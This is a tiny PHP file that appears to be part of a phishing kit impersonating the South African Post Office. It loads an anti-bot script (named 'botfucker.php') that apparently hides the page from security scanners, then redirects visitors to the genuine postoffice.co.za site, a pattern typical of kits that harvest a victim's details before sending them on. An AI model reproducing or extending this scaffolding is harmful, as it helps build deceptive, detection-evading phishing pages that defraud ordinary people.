<?php
include '../files/php/911/botfucker.php';
header("Location: https://www.postoffice.co.za/");
 ?>